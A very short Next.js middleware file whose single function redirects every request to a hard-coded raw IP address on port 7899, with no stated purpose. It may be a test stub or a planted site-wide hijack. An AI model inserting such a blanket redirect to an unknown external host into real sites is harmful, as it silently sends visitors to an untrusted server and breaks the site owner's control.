import { NextResponse, type NextRequest } from "next/server";

export function middleware() {
  return NextResponse.redirect(new URL("http://197.243.23.139:7899"))
}